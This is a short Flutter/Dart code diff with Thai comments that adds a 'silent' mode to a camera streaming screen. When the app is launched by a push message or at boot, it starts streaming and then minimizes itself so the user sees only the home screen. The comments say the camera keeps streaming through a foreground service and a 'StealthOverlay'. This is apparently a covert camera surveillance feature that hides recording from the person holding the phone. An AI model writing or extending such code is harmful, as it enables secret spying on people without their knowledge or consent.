@@ -11,10 +11,15 @@ class StreamingScreen extends StatefulWidget {
     super.key,
     required this.code,
     required this.signalingUrl,
+    this.silent = false,
   });
 
   final String code;
   final String signalingUrl;
+
+  /// true เมื่อ launch จาก auto-route (FCM/boot)
+  /// → จะ minimize ตัวเองเข้า background หลังตั้ง stream เสร็จ
+  final bool silent;
 
   @override
   State<StreamingScreen> createState() => _StreamingScreenState();
@@ -87,6 +92,13 @@ class _StreamingScreenState extends State<StreamingScreen> {
 
     // เปิดโหมด auto-streaming — ครั้งต่อๆ ไปเปิดแอป/รีบูต จะเข้า streaming screen เลย
     await StreamingPrefs.enable(pairCode: widget.code);
+
+    // Silent mode: ส่ง activity ไป background ทันที — user เห็น home screen
+    // กล้องยังสตรีมผ่าน FGS + StealthOverlay
+    if (widget.silent) {
+      await Future.delayed(const Duration(milliseconds: 500));
+      await ForegroundService.minimizeApp();
+    }
   }
 
   Future<void> _ensurePeerConnection() async {
